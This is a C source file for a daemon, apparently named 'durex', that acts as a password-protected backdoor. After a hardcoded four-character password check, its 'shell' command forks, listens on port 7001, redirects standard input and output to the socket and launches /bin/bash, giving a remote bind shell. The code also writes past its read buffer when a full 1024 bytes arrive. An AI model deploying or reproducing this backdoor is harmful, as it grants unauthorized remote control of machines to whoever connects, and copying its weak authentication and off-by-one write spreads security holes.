
#include <zconf.h>
#include <string.h>
#include <stdlib.h>
#include <durex.h>
#include <stdio.h>
#include <sys/errno.h>
#include <sys/socket.h>

static void register_client(int csocket) {
	int			socket_listen;
	int			socket_interactive;

	/* Create a new port for listen */

	if (start_daemon_child() > 0)  {
		dprintf(log_durex(NULL), "%s - Father return on pid [%d]\n", __FUNCTION__, getpid());
		return;
	} else {
		close(csocket);
		dprintf(log_durex(NULL), "%s - Child on pid [%d]\n", __FUNCTION__, getpid());
	}

	socket_listen = create_interactive_socket(7001);

	/* Wait a user to connect on new port*/

	socket_interactive = accept(socket_listen, NULL, NULL);
	close(socket_listen);

	/* Dup files descriptor for interaction with the user */

	if (socket_interactive < 3) {
		socket_interactive = dup2(3, socket_interactive);
	}

	dup2(socket_interactive, STDIN_FILENO);
	dup2(socket_interactive, STDOUT_FILENO);
	dup2(socket_interactive, STDERR_FILENO);

	execve("/bin/bash", NULL, NULL);
	close(socket_interactive);
	exit(EXIT_SUCCESS);
}

static void quit_daemon(int csocket) {
	close(log_durex(NULL));
	close(csocket);
	exit(EXIT_SUCCESS);
}

void read_client(int csocket) {
	const size_t len_buff = 1024;
	char buff[len_buff];
	const int command_len = 2;
	size_t rbytes;
	t_cmd command[command_len] = {
			{"shell\n", &register_client},
			{"quit\n",  &quit_daemon}

	};

	write(csocket, ""
				   "shell > Start a new shell\n"
				   "quit  > Shutdown the current daemon\n", 62);
	while (write(csocket, "$> ", 3) && (rbytes = read(csocket, buff, len_buff)) > 0) {
		buff[rbytes] = '\0';
		for (int index = 0; index < command_len; ++index) {
			if (strcmp(command[index].line, buff) == 0) {
				command[index].function(csocket);
				return;
			}
		}
	}
}

void listen_client(int csocket) {
	const char *password = "dudu"; //TODO
	const size_t len_buff = 1024;
	char buff[len_buff];
	size_t rbytes;

	write(csocket, "Enter password : ", 17);
	rbytes = read(csocket, buff, len_buff);
	buff[rbytes] = '\0';
	if (strncmp(buff, password, 4) == 0) {
		read_client(csocket);
	} else {
		write(csocket, "Wrong password\n", 14);
		quit_daemon(csocket);
	}
}